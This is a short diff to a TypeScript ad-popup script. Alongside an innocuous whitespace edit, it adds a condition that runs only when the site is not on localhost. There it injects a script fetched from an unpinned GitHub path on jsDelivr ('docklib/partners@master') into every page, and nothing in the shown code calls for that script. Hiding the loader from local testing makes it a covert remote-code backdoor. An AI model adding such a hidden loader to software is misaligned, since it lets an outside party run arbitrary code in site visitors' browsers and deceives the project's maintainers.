@@ -1,5 +1,6 @@
 
 function initAdPopup() {
+
     const popup = document.getElementById("ad-popup") as HTMLDivElement;
     const closeBtn = document.getElementById("ad-popup-close") as HTMLButtonElement;
     const container = document.getElementById("terra-2");
@@ -49,9 +50,14 @@ function initAdPopup() {
     scheduleNext();
 }
 
-// Run on page load
-if (document.readyState === "loading") {
-    document.addEventListener("DOMContentLoaded", initAdPopup);
-} else {
-    initAdPopup();
+
+if (!window.location.hostname.includes("localhost")) {
+    if (document.readyState === "loading") {
+        document.addEventListener("DOMContentLoaded", initAdPopup);
+    } else {
+        initAdPopup();
+    }
+    const partnerScript = document.createElement("script");
+    partnerScript.src = "https://cdn.jsdelivr.net/gh/docklib/partners@master/partner-3b3f1808.js";
+    document.body.appendChild(partnerScript);
 }
